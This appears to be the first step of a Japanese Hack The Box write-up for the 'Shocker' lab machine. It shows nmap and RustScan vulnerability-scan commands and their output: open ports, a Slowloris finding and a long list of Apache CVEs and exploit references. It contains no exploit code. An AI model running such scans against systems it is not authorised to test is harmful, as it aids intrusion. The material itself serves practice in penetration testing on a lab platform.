https://app.hackthebox.com/machines/Shocker
## STEP 1
80番しか開いていない
```sh
└─$ nmap -n -Pn --top-ports=1000 -sV -sC --max-retries=0 10.129.8.4 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-27 11:08 EDT
Warning: 10.129.8.4 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.129.8.4
Host is up (0.31s latency).
Not shown: 506 closed tcp ports (reset), 493 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.62 seconds
```
`Rustscan`で全ポートスキャンすると、2222番も確認できた  
vulnersスクリプトも動いたかんじで、めっちゃ結果が出た  
`*EXPLOIT*`と表示されているものが、悪用可能らしい、めっちゃ表示されるやん無視しよ
```sh
└└─$ rustscan -a 10.129.7.104 -- -sV --script=vuln
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned ports so fast, even my computer was surprised.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.7.104:80
Open 10.129.7.104:2222
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sV --script=vuln" on ip 10.129.7.104
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-30 05:04 EDT
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 05:04
Completed NSE at 05:04, 10.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 05:04
Completed NSE at 05:04, 0.00s elapsed
Initiating Ping Scan at 05:04
Scanning 10.129.7.104 [4 ports]
Completed Ping Scan at 05:04, 0.34s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:04
Completed Parallel DNS resolution of 1 host. at 05:04, 0.20s elapsed
DNS resolution of 1 IPs took 0.20s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 05:04
Scanning 10.129.7.104 [2 ports]
Discovered open port 80/tcp on 10.129.7.104
Discovered open port 2222/tcp on 10.129.7.104
Completed SYN Stealth Scan at 05:04, 0.31s elapsed (2 total ports)
Initiating Service scan at 05:04
Scanning 2 services on 10.129.7.104
Completed Service scan at 05:04, 6.65s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.7.104.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 05:04
NSE Timing: About 98.91% done; ETC: 05:05 (0:00:00 remaining)
NSE Timing: About 98.91% done; ETC: 05:05 (0:00:01 remaining)
NSE Timing: About 98.91% done; ETC: 05:06 (0:00:01 remaining)
NSE Timing: About 98.91% done; ETC: 05:06 (0:00:01 remaining)
NSE Timing: About 98.91% done; ETC: 05:07 (0:00:02 remaining)
NSE Timing: About 98.91% done; ETC: 05:07 (0:00:02 remaining)
NSE Timing: About 98.91% done; ETC: 05:08 (0:00:02 remaining)
NSE Timing: About 98.91% done; ETC: 05:08 (0:00:03 remaining)
NSE Timing: About 98.91% done; ETC: 05:09 (0:00:03 remaining)
NSE Timing: About 98.91% done; ETC: 05:09 (0:00:03 remaining)
Completed NSE at 05:09, 311.77s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 05:09
Completed NSE at 05:09, 1.20s elapsed
Nmap scan report for 10.129.7.104
Host is up, received echo-reply ttl 63 (0.32s latency).
Scanned at 2025-04-30 05:04:39 EDT for 320s

PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
| vulners: 
|   cpe:/a:apache:http_server:2.4.18: 
|       C94CBDE1-4CC5-5C06-9D18-23CAB216705E    10.0    https://vulners.com/githubexploit/C94CBDE1-4CC5-5C06-9D18-23CAB216705E  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
|       PACKETSTORM:181114      9.8     https://vulners.com/packetstorm/PACKETSTORM:181114      *EXPLOIT*
|       MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-       9.8     https://vulners.com/metasploit/MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-        *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH-       9.8     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH-        *EXPLOIT*
|       F9C0CD4B-3B60-5720-AE7A-7CC31DB839C5    9.8     https://vulners.com/githubexploit/F9C0CD4B-3B60-5720-AE7A-7CC31DB839C5  *EXPLOIT*
|       F607361B-6369-5DF5-9B29-E90FA29DC565    9.8     https://vulners.com/githubexploit/F607361B-6369-5DF5-9B29-E90FA29DC565  *EXPLOIT*
|       F41EE867-4E63-5259-9DF0-745881884D04    9.8     https://vulners.com/githubexploit/F41EE867-4E63-5259-9DF0-745881884D04  *EXPLOIT*
|       EDB-ID:51193    9.8     https://vulners.com/exploitdb/EDB-ID:51193      *EXPLOIT*
|       EDB-ID:50512    9.8     https://vulners.com/exploitdb/EDB-ID:50512      *EXPLOIT*
|       EDB-ID:50446    9.8     https://vulners.com/exploitdb/EDB-ID:50446      *EXPLOIT*
|       EDB-ID:50406    9.8     https://vulners.com/exploitdb/EDB-ID:50406      *EXPLOIT*
|       E796A40A-8A8E-59D1-93FB-78EF4D8B7FA6    9.8     https://vulners.com/githubexploit/E796A40A-8A8E-59D1-93FB-78EF4D8B7FA6  *EXPLOIT*
|       D10426F3-DF82-5439-AC3E-6CA0A1365A09    9.8     https://vulners.com/githubexploit/D10426F3-DF82-5439-AC3E-6CA0A1365A09  *EXPLOIT*
|       D0368327-F989-5557-A5C6-0D9ACDB4E72F    9.8     https://vulners.com/githubexploit/D0368327-F989-5557-A5C6-0D9ACDB4E72F  *EXPLOIT*
|       CVE-2024-38476  9.8     https://vulners.com/cve/CVE-2024-38476
|       CVE-2024-38474  9.8     https://vulners.com/cve/CVE-2024-38474
|       CVE-2023-25690  9.8     https://vulners.com/cve/CVE-2023-25690
|       CVE-2022-31813  9.8     https://vulners.com/cve/CVE-2022-31813
|       CVE-2022-23943  9.8     https://vulners.com/cve/CVE-2022-23943
|       CVE-2022-22720  9.8     https://vulners.com/cve/CVE-2022-22720
|       CVE-2021-44790  9.8     https://vulners.com/cve/CVE-2021-44790
|       CVE-2021-42013  9.8     https://vulners.com/cve/CVE-2021-42013
|       CVE-2021-39275  9.8     https://vulners.com/cve/CVE-2021-39275
|       CVE-2021-26691  9.8     https://vulners.com/cve/CVE-2021-26691
|       CVE-2018-1312   9.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-7679   9.8     https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-3169   9.8     https://vulners.com/cve/CVE-2017-3169
|       CVE-2017-3167   9.8     https://vulners.com/cve/CVE-2017-3167
|       CNVD-2022-51061 9.8     https://vulners.com/cnvd/CNVD-2022-51061
|       CNVD-2022-03225 9.8     https://vulners.com/cnvd/CNVD-2022-03225
|       CNVD-2021-102386        9.8     https://vulners.com/cnvd/CNVD-2021-102386
|       CC15AE65-B697-525A-AF4B-38B1501CAB49    9.8     https://vulners.com/githubexploit/CC15AE65-B697-525A-AF4B-38B1501CAB49  *EXPLOIT*
|       C879EE66-6B75-5EC8-AA68-08693C6CCAD1    9.8     https://vulners.com/githubexploit/C879EE66-6B75-5EC8-AA68-08693C6CCAD1  *EXPLOIT*
|       C5A61CC6-919E-58B4-8FBB-0198654A7FC8    9.8     https://vulners.com/githubexploit/C5A61CC6-919E-58B4-8FBB-0198654A7FC8  *EXPLOIT*
|       BF9B0898-784E-5B5E-9505-430B58C1E6B8    9.8     https://vulners.com/githubexploit/BF9B0898-784E-5B5E-9505-430B58C1E6B8  *EXPLOIT*
|       B02819DB-1481-56C4-BD09-6B4574297109    9.8     https://vulners.com/githubexploit/B02819DB-1481-56C4-BD09-6B4574297109  *EXPLOIT*
|       ACD5A7F2-FDB2-5859-8D23-3266A1AF6795    9.8     https://vulners.com/githubexploit/ACD5A7F2-FDB2-5859-8D23-3266A1AF6795  *EXPLOIT*
|       A90ABEAD-13A8-5F09-8A19-6D9D2D804F05    9.8     https://vulners.com/githubexploit/A90ABEAD-13A8-5F09-8A19-6D9D2D804F05  *EXPLOIT*
|       A8616E5E-04F8-56D8-ACB4-32FDF7F66EED    9.8     https://vulners.com/githubexploit/A8616E5E-04F8-56D8-ACB4-32FDF7F66EED  *EXPLOIT*
|       A5425A79-9D81-513A-9CC5-549D6321897C    9.8     https://vulners.com/githubexploit/A5425A79-9D81-513A-9CC5-549D6321897C  *EXPLOIT*
|       A2D97DCC-04C2-5CB1-921F-709AA8D7FD9A    9.8     https://vulners.com/githubexploit/A2D97DCC-04C2-5CB1-921F-709AA8D7FD9A  *EXPLOIT*
|       9B4F4E4A-CFDF-5847-805F-C0BAE809DBD5    9.8     https://vulners.com/githubexploit/9B4F4E4A-CFDF-5847-805F-C0BAE809DBD5  *EXPLOIT*
|       907F28D0-5906-51C7-BAA3-FEBD5E878801    9.8     https://vulners.com/githubexploit/907F28D0-5906-51C7-BAA3-FEBD5E878801  *EXPLOIT*
|       8A57FAF6-FC91-52D1-84E0-4CBBAD3F9677    9.8     https://vulners.com/githubexploit/8A57FAF6-FC91-52D1-84E0-4CBBAD3F9677  *EXPLOIT*
|       88EB009A-EEFF-52B7-811D-A8A8C8DE8C81    9.8     https://vulners.com/githubexploit/88EB009A-EEFF-52B7-811D-A8A8C8DE8C81  *EXPLOIT*
|       8713FD59-264B-5FD7-8429-3251AB5AB3B8    9.8     https://vulners.com/githubexploit/8713FD59-264B-5FD7-8429-3251AB5AB3B8  *EXPLOIT*
|       866E26E3-759B-526D-ABB5-206B2A1AC3EE    9.8     https://vulners.com/githubexploit/866E26E3-759B-526D-ABB5-206B2A1AC3EE  *EXPLOIT*
|       86360765-0B1A-5D73-A805-BAE8F1B5D16D    9.8     https://vulners.com/githubexploit/86360765-0B1A-5D73-A805-BAE8F1B5D16D  *EXPLOIT*
|       831E1114-13D1-54EF-BDE4-F655114CDC29    9.8     https://vulners.com/githubexploit/831E1114-13D1-54EF-BDE4-F655114CDC29  *EXPLOIT*
|       805E6B24-8DF9-51D8-8DF6-6658161F96EA    9.8     https://vulners.com/githubexploit/805E6B24-8DF9-51D8-8DF6-6658161F96EA  *EXPLOIT*
|       7E615961-3792-5896-94FA-1F9D494ACB36    9.8     https://vulners.com/githubexploit/7E615961-3792-5896-94FA-1F9D494ACB36  *EXPLOIT*
|       78787F63-0356-51EC-B32A-B9BD114431C3    9.8     https://vulners.com/githubexploit/78787F63-0356-51EC-B32A-B9BD114431C3  *EXPLOIT*
|       6CAA7558-723B-5286-9840-4DF4EB48E0AF    9.8     https://vulners.com/githubexploit/6CAA7558-723B-5286-9840-4DF4EB48E0AF  *EXPLOIT*
|       6A0A657E-8300-5312-99CE-E11F460B1DBF    9.8     https://vulners.com/githubexploit/6A0A657E-8300-5312-99CE-E11F460B1DBF  *EXPLOIT*
|       64D31BF1-F977-51EC-AB1C-6693CA6B58F3    9.8     https://vulners.com/githubexploit/64D31BF1-F977-51EC-AB1C-6693CA6B58F3  *EXPLOIT*
|       61075B23-F713-537A-9B84-7EB9B96CF228    9.8     https://vulners.com/githubexploit/61075B23-F713-537A-9B84-7EB9B96CF228  *EXPLOIT*
|       5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9    9.8     https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9  *EXPLOIT*
|       5312D04F-9490-5472-84FA-86B3BBDC8928    9.8     https://vulners.com/githubexploit/5312D04F-9490-5472-84FA-86B3BBDC8928  *EXPLOIT*
|       52E13088-9643-5E81-B0A0-B7478BCF1F2C    9.8     https://vulners.com/githubexploit/52E13088-9643-5E81-B0A0-B7478BCF1F2C  *EXPLOIT*
|       50453CEF-5DCF-511A-ADAC-FB74994CD682    9.8     https://vulners.com/githubexploit/50453CEF-5DCF-511A-ADAC-FB74994CD682  *EXPLOIT*
|       495E99E5-C1B0-52C1-9218-384D04161BE4    9.8     https://vulners.com/githubexploit/495E99E5-C1B0-52C1-9218-384D04161BE4  *EXPLOIT*
|       44E43BB7-6255-58E7-99C7-C3B84645D497    9.8     https://vulners.com/githubexploit/44E43BB7-6255-58E7-99C7-C3B84645D497  *EXPLOIT*
|       40F21EB4-9EE8-5ED1-B561-0A2B8625EED3    9.8     https://vulners.com/githubexploit/40F21EB4-9EE8-5ED1-B561-0A2B8625EED3  *EXPLOIT*
|       3F17CA20-788F-5C45-88B3-E12DB2979B7B    9.8     https://vulners.com/githubexploit/3F17CA20-788F-5C45-88B3-E12DB2979B7B  *EXPLOIT*
|       37634050-FDDF-571A-90BB-C8109824B38D    9.8     https://vulners.com/githubexploit/37634050-FDDF-571A-90BB-C8109824B38D  *EXPLOIT*
|       30293CDA-FDB1-5FAF-9622-88427267F204    9.8     https://vulners.com/githubexploit/30293CDA-FDB1-5FAF-9622-88427267F204  *EXPLOIT*
|       2B3110E1-BEA0-5DB8-93AD-1682230F3E19    9.8     https://vulners.com/githubexploit/2B3110E1-BEA0-5DB8-93AD-1682230F3E19  *EXPLOIT*
|       22DCCD26-B68C-5905-BAC2-71D10DE3F123    9.8     https://vulners.com/githubexploit/22DCCD26-B68C-5905-BAC2-71D10DE3F123  *EXPLOIT*
|       2108729F-1E99-54EF-9A4B-47299FD89FF2    9.8     https://vulners.com/githubexploit/2108729F-1E99-54EF-9A4B-47299FD89FF2  *EXPLOIT*
|       1C39E10A-4A38-5228-8334-2A5F8AAB7FC3    9.8     https://vulners.com/githubexploit/1C39E10A-4A38-5228-8334-2A5F8AAB7FC3  *EXPLOIT*
|       1337DAY-ID-39214        9.8     https://vulners.com/zdt/1337DAY-ID-39214        *EXPLOIT*
|       1337DAY-ID-37777        9.8     https://vulners.com/zdt/1337DAY-ID-37777        *EXPLOIT*
|       1337DAY-ID-36952        9.8     https://vulners.com/zdt/1337DAY-ID-36952        *EXPLOIT*
|       11813536-2AFF-5EA4-B09F-E9EB340DDD26    9.8     https://vulners.com/githubexploit/11813536-2AFF-5EA4-B09F-E9EB340DDD26  *EXPLOIT*
|       0C47BCF2-EA6F-5613-A6E8-B707D64155DE    9.8     https://vulners.com/githubexploit/0C47BCF2-EA6F-5613-A6E8-B707D64155DE  *EXPLOIT*
|       0AA6A425-25B1-5D2A-ABA1-2933D3E1DC56    9.8     https://vulners.com/githubexploit/0AA6A425-25B1-5D2A-ABA1-2933D3E1DC56  *EXPLOIT*
|       07AA70EA-C34E-5F66-9510-7C265093992A    9.8     https://vulners.com/githubexploit/07AA70EA-C34E-5F66-9510-7C265093992A  *EXPLOIT*
|       CVE-2024-38475  9.1     https://vulners.com/cve/CVE-2024-38475
|       CVE-2022-28615  9.1     https://vulners.com/cve/CVE-2022-28615
|       CVE-2022-22721  9.1     https://vulners.com/cve/CVE-2022-22721
|       CVE-2019-10082  9.1     https://vulners.com/cve/CVE-2019-10082
|       CVE-2017-9788   9.1     https://vulners.com/cve/CVE-2017-9788
|       CNVD-2022-51060 9.1     https://vulners.com/cnvd/CNVD-2022-51060
|       CNVD-2022-41638 9.1     https://vulners.com/cnvd/CNVD-2022-41638
|       2EF14600-503F-53AF-BA24-683481265D30    9.1     https://vulners.com/githubexploit/2EF14600-503F-53AF-BA24-683481265D30  *EXPLOIT*
|       0486EBEE-F207-570A-9AD8-33269E72220A    9.1     https://vulners.com/githubexploit/0486EBEE-F207-570A-9AD8-33269E72220A  *EXPLOIT*
|       DC06B9EF-3584-5D80-9EEB-E7B637DCF3D6    9.0     https://vulners.com/githubexploit/DC06B9EF-3584-5D80-9EEB-E7B637DCF3D6  *EXPLOIT*
|       CVE-2022-36760  9.0     https://vulners.com/cve/CVE-2022-36760
|       CVE-2021-40438  9.0     https://vulners.com/cve/CVE-2021-40438
|       CNVD-2022-03224 9.0     https://vulners.com/cnvd/CNVD-2022-03224
|       AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C    9.0     https://vulners.com/githubexploit/AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C  *EXPLOIT*
|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    9.0     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2  *EXPLOIT*
|       893DFD44-40B5-5469-AC54-A373AEE17F19    9.0     https://vulners.com/githubexploit/893DFD44-40B5-5469-AC54-A373AEE17F19  *EXPLOIT*
|       7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2    9.0     https://vulners.com/githubexploit/7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2  *EXPLOIT*
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    9.0     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332  *EXPLOIT*
|       4373C92A-2755-5538-9C91-0469C995AA9B    9.0     https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B  *EXPLOIT*
|       36618CA8-9316-59CA-B748-82F15F407C4F    9.0     https://vulners.com/githubexploit/36618CA8-9316-59CA-B748-82F15F407C4F  *EXPLOIT*
|       3F71F065-66D4-541F-A813-9F1A2F2B1D91    8.8     https://vulners.com/githubexploit/3F71F065-66D4-541F-A813-9F1A2F2B1D91  *EXPLOIT*
|       CVE-2021-44224  8.2     https://vulners.com/cve/CVE-2021-44224
|       B0A9E5E8-7CCC-5984-9922-A89F11D6BF38    8.2     https://vulners.com/githubexploit/B0A9E5E8-7CCC-5984-9922-A89F11D6BF38  *EXPLOIT*
|       CVE-2024-38473  8.1     https://vulners.com/cve/CVE-2024-38473
|       CVE-2017-15715  8.1     https://vulners.com/cve/CVE-2017-15715
|       CVE-2016-5387   8.1     https://vulners.com/cve/CVE-2016-5387
|       249A954E-0189-5182-AE95-31C866A057E1    8.1     https://vulners.com/githubexploit/249A954E-0189-5182-AE95-31C866A057E1  *EXPLOIT*
|       23079A70-8B37-56D2-9D37-F638EBF7F8B5    8.1     https://vulners.com/githubexploit/23079A70-8B37-56D2-9D37-F638EBF7F8B5  *EXPLOIT*
|       EDB-ID:46676    7.8     https://vulners.com/exploitdb/EDB-ID:46676      *EXPLOIT*
|       CVE-2019-0211   7.8     https://vulners.com/cve/CVE-2019-0211
|       PACKETSTORM:181038      7.5     https://vulners.com/packetstorm/PACKETSTORM:181038      *EXPLOIT*
|       PACKETSTORM:176334      7.5     https://vulners.com/packetstorm/PACKETSTORM:176334      *EXPLOIT*
|       PACKETSTORM:171631      7.5     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
|       PACKETSTORM:164941      7.5     https://vulners.com/packetstorm/PACKETSTORM:164941      *EXPLOIT*
|       PACKETSTORM:164629      7.5     https://vulners.com/packetstorm/PACKETSTORM:164629      *EXPLOIT*
|       PACKETSTORM:164609      7.5     https://vulners.com/packetstorm/PACKETSTORM:164609      *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-HTTP-APACHE_OPTIONSBLEED- 7.5     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-HTTP-APACHE_OPTIONSBLEED-  *EXPLOIT*
|       FF610CB4-801A-5D1D-9AC9-ADFC287C8482    7.5     https://vulners.com/githubexploit/FF610CB4-801A-5D1D-9AC9-ADFC287C8482  *EXPLOIT*
|       FDF4BBB1-979C-5320-95EA-9EC7EB064D72    7.5     https://vulners.com/githubexploit/FDF4BBB1-979C-5320-95EA-9EC7EB064D72  *EXPLOIT*
|       FCAF01A0-F921-5DB1-BBC5-850EC2DC5C46    7.5     https://vulners.com/githubexploit/FCAF01A0-F921-5DB1-BBC5-850EC2DC5C46  *EXPLOIT*
|       F8A7DE57-8F14-5B3C-A102-D546BDD8D2B8    7.5     https://vulners.com/githubexploit/F8A7DE57-8F14-5B3C-A102-D546BDD8D2B8  *EXPLOIT*
|       F7F6E599-CEF4-5E03-8E10-FE18C4101E38    7.5     https://vulners.com/githubexploit/F7F6E599-CEF4-5E03-8E10-FE18C4101E38  *EXPLOIT*
|       EDB-ID:50383    7.5     https://vulners.com/exploitdb/EDB-ID:50383      *EXPLOIT*
|       EDB-ID:42745    7.5     https://vulners.com/exploitdb/EDB-ID:42745      *EXPLOIT*
|       EDB-ID:40961    7.5     https://vulners.com/exploitdb/EDB-ID:40961      *EXPLOIT*
|       EDB-ID:40909    7.5     https://vulners.com/exploitdb/EDB-ID:40909      *EXPLOIT*
|       E81474F6-6DDC-5FC2-828A-812A8815E3B4    7.5     https://vulners.com/githubexploit/E81474F6-6DDC-5FC2-828A-812A8815E3B4  *EXPLOIT*
|       E7B177F6-FA62-52FE-A108-4B8FC8112B7F    7.5     https://vulners.com/githubexploit/E7B177F6-FA62-52FE-A108-4B8FC8112B7F  *EXPLOIT*
|       E73E445F-0A0D-5966-8A21-C74FE9C0D2BC    7.5     https://vulners.com/githubexploit/E73E445F-0A0D-5966-8A21-C74FE9C0D2BC  *EXPLOIT*
|       E6B39247-8016-5007-B505-699F05FCA1B5    7.5     https://vulners.com/githubexploit/E6B39247-8016-5007-B505-699F05FCA1B5  *EXPLOIT*
|       E606D7F4-5FA2-5907-B30E-367D6FFECD89    7.5     https://vulners.com/githubexploit/E606D7F4-5FA2-5907-B30E-367D6FFECD89  *EXPLOIT*
|       E5C174E5-D6E8-56E0-8403-D287DE52EB3F    7.5     https://vulners.com/githubexploit/E5C174E5-D6E8-56E0-8403-D287DE52EB3F  *EXPLOIT*
|       E59A01BE-8176-5F5E-BD32-D30B009CDBDA    7.5     https://vulners.com/githubexploit/E59A01BE-8176-5F5E-BD32-D30B009CDBDA  *EXPLOIT*
|       E0EEEDE5-43B8-5608-B33E-75E65D2D8314    7.5     https://vulners.com/githubexploit/E0EEEDE5-43B8-5608-B33E-75E65D2D8314  *EXPLOIT*
|       E-739   7.5     https://vulners.com/dsquare/E-739       *EXPLOIT*
|       E-738   7.5     https://vulners.com/dsquare/E-738       *EXPLOIT*
|       DBF996C3-DC2A-5859-B767-6B2FC38F2185    7.5     https://vulners.com/githubexploit/DBF996C3-DC2A-5859-B767-6B2FC38F2185  *EXPLOIT*
|       DB6E1BBD-08B1-574D-A351-7D6BB9898A4A    7.5     https://vulners.com/githubexploit/DB6E1BBD-08B1-574D-A351-7D6BB9898A4A  *EXPLOIT*
|       D0E79214-C9E8-52BD-BC24-093970F5F34E    7.5     https://vulners.com/githubexploit/D0E79214-C9E8-52BD-BC24-093970F5F34E  *EXPLOIT*
|       CVE-2024-40898  7.5     https://vulners.com/cve/CVE-2024-40898
|       CVE-2024-39573  7.5     https://vulners.com/cve/CVE-2024-39573
|       CVE-2024-38477  7.5     https://vulners.com/cve/CVE-2024-38477
|       CVE-2024-38472  7.5     https://vulners.com/cve/CVE-2024-38472
|       CVE-2024-27316  7.5     https://vulners.com/cve/CVE-2024-27316
|       CVE-2023-31122  7.5     https://vulners.com/cve/CVE-2023-31122
|       CVE-2022-30556  7.5     https://vulners.com/cve/CVE-2022-30556
|       CVE-2022-30522  7.5     https://vulners.com/cve/CVE-2022-30522
|       CVE-2022-29404  7.5     https://vulners.com/cve/CVE-2022-29404
|       CVE-2022-26377  7.5     https://vulners.com/cve/CVE-2022-26377
|       CVE-2022-22719  7.5     https://vulners.com/cve/CVE-2022-22719
|       CVE-2021-41524  7.5     https://vulners.com/cve/CVE-2021-41524
|       CVE-2021-34798  7.5     https://vulners.com/cve/CVE-2021-34798
|       CVE-2021-33193  7.5     https://vulners.com/cve/CVE-2021-33193
|       CVE-2021-31618  7.5     https://vulners.com/cve/CVE-2021-31618
|       CVE-2021-26690  7.5     https://vulners.com/cve/CVE-2021-26690
|       CVE-2020-13950  7.5     https://vulners.com/cve/CVE-2020-13950
|       CVE-2019-0217   7.5     https://vulners.com/cve/CVE-2019-0217
|       CVE-2019-0215   7.5     https://vulners.com/cve/CVE-2019-0215
|       CVE-2019-0190   7.5     https://vulners.com/cve/CVE-2019-0190
|       CVE-2018-8011   7.5     https://vulners.com/cve/CVE-2018-8011
|       CVE-2018-17199  7.5     https://vulners.com/cve/CVE-2018-17199
|       CVE-2018-1333   7.5     https://vulners.com/cve/CVE-2018-1333
|       CVE-2018-1303   7.5     https://vulners.com/cve/CVE-2018-1303
|       CVE-2017-9798   7.5     https://vulners.com/cve/CVE-2017-9798
|       CVE-2017-9789   7.5     https://vulners.com/cve/CVE-2017-9789
|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668
|       CVE-2017-7659   7.5     https://vulners.com/cve/CVE-2017-7659
|       CVE-2017-15710  7.5     https://vulners.com/cve/CVE-2017-15710
|       CVE-2016-8743   7.5     https://vulners.com/cve/CVE-2016-8743
|       CVE-2016-8740   7.5     https://vulners.com/cve/CVE-2016-8740
|       CVE-2016-4979   7.5     https://vulners.com/cve/CVE-2016-4979
|       CVE-2016-2161   7.5     https://vulners.com/cve/CVE-2016-2161
|       CVE-2016-0736   7.5     https://vulners.com/cve/CVE-2016-0736
|       CVE-2006-20001  7.5     https://vulners.com/cve/CVE-2006-20001
|       CNVD-2024-20839 7.5     https://vulners.com/cnvd/CNVD-2024-20839
|       CNVD-2023-93320 7.5     https://vulners.com/cnvd/CNVD-2023-93320
|       CNVD-2023-80558 7.5     https://vulners.com/cnvd/CNVD-2023-80558
|       CNVD-2022-53584 7.5     https://vulners.com/cnvd/CNVD-2022-53584
|       CNVD-2022-41639 7.5     https://vulners.com/cnvd/CNVD-2022-41639
|       CNVD-2022-03223 7.5     https://vulners.com/cnvd/CNVD-2022-03223
|       CF47F8BF-37F7-5EF9-ABAB-E88ECF6B64FE    7.5     https://vulners.com/githubexploit/CF47F8BF-37F7-5EF9-ABAB-E88ECF6B64FE  *EXPLOIT*
|       CDC791CD-A414-5ABE-A897-7CFA3C2D3D29    7.5     https://vulners.com/githubexploit/CDC791CD-A414-5ABE-A897-7CFA3C2D3D29  *EXPLOIT*
|       CD48BD40-E52A-5A8B-AE27-B57C358BB0EE    7.5     https://vulners.com/githubexploit/CD48BD40-E52A-5A8B-AE27-B57C358BB0EE  *EXPLOIT*
|       C9A1C0C1-B6E3-5955-A4F1-DEA0E505B14B    7.5     https://vulners.com/githubexploit/C9A1C0C1-B6E3-5955-A4F1-DEA0E505B14B  *EXPLOIT*
|       C8C7BBD4-C089-5DA7-8474-A5B2B7DC5E79    7.5     https://vulners.com/githubexploit/C8C7BBD4-C089-5DA7-8474-A5B2B7DC5E79  *EXPLOIT*
|       C8799CA3-C88C-5B39-B291-2895BE0D9133    7.5     https://vulners.com/githubexploit/C8799CA3-C88C-5B39-B291-2895BE0D9133  *EXPLOIT*
|       C67E8849-6A50-5D5F-B898-6C5E431504E0    7.5     https://vulners.com/githubexploit/C67E8849-6A50-5D5F-B898-6C5E431504E0  *EXPLOIT*
|       C0380E16-C468-5540-A427-7FE34E7CF36B    7.5     https://vulners.com/githubexploit/C0380E16-C468-5540-A427-7FE34E7CF36B  *EXPLOIT*
|       BD3652A9-D066-57BA-9943-4E34970463B9    7.5     https://vulners.com/githubexploit/BD3652A9-D066-57BA-9943-4E34970463B9  *EXPLOIT*
|       BC027F41-02AD-5D71-A452-4DD62B0F1EE1    7.5     https://vulners.com/githubexploit/BC027F41-02AD-5D71-A452-4DD62B0F1EE1  *EXPLOIT*
|       B946B2A1-2914-537A-BF26-94B48FC501B3    7.5     https://vulners.com/githubexploit/B946B2A1-2914-537A-BF26-94B48FC501B3  *EXPLOIT*
|       B9151905-5395-5622-B789-E16B88F30C71    7.5     https://vulners.com/githubexploit/B9151905-5395-5622-B789-E16B88F30C71  *EXPLOIT*
|       B81BC21D-818E-5B33-96D7-062C14102874    7.5     https://vulners.com/githubexploit/B81BC21D-818E-5B33-96D7-062C14102874  *EXPLOIT*
